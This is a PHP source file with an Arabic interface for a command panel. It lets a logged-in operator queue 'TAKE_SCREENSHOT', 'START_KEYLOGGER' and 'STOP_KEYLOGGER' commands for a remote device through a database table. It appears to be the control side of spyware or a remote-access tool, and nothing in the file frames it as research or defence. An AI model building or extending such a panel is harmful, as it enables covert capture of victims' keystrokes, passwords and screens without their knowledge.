<?php
session_start();

if (!isset($_SESSION['device_id'])) {
    header("Location: index.php");
    exit;
}

include 'db_config.php';

$device_id = $_SESSION['device_id'];

$message = "";

if ($_SERVER['REQUEST_METHOD'] == 'POST') {

    $command = trim($_POST['command']);

    if (!empty($command)) {

        $stmt = $conn->prepare("
            INSERT INTO commands 
            (device_id, command, status)
            VALUES
            (:device_id, :command, 'pending')
        ");

        $stmt->execute([
            ':device_id' => $device_id,
            ':command' => $command
        ]);

        $message = "تم إرسال الأمر بنجاح";
    }
}
?>

<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>لوحة الأوامر</title>

<style>

body{
    background:#0f172a;
    font-family:Tahoma;
    color:white;
    margin:0;
}

.container{
    width:90%;
    max-width:700px;
    margin:auto;
    margin-top:40px;
}

.box{
    background:#1e293b;
    padding:30px;
    border-radius:20px;
}

h1{
    text-align:center;
    margin-bottom:30px;
}

button{
    width:100%;
    padding:16px;
    margin-top:15px;
    border:none;
    border-radius:12px;
    font-size:16px;
    cursor:pointer;
    color:white;
}

.screen{
    background:#2563eb;
}

.key_start{
    background:#059669;
}

.key_stop{
    background:#dc2626;
}

button:hover{
    opacity:0.9;
}

.success{
    background:#14532d;
    padding:12px;
    border-radius:10px;
    margin-bottom:20px;
    text-align:center;
}

.back{
    display:inline-block;
    margin-top:20px;
    background:#334155;
    color:white;
    padding:12px 18px;
    border-radius:10px;
    text-decoration:none;
}

</style>

</head>

<body>

<div class="container">

    <div class="box">

        <h1>لوحة التحكم بالأوامر</h1>

        <?php if(!empty($message)): ?>
            <div class="success">
                <?php echo $message; ?>
            </div>
        <?php endif; ?>

        <form method="POST">

            <button 
                class="screen"
                type="submit"
                name="command"
                value="TAKE_SCREENSHOT"
            >
                📸 تصوير الشاشة
            </button>

            <button 
                class="key_start"
                type="submit"
                name="command"
                value="START_KEYLOGGER"
            >
                ⌨️ بدء تسجيل الكيبورد
            </button>

            <button 
                class="key_stop"
                type="submit"
                name="command"
                value="STOP_KEYLOGGER"
            >
                🛑 إيقاف تسجيل الكيبورد
            </button>

        </form>

        <a class="back" href="dashboard.php">
            رجوع للوحة التحكم
        </a>

    </div>

</div>

</body>
</html>
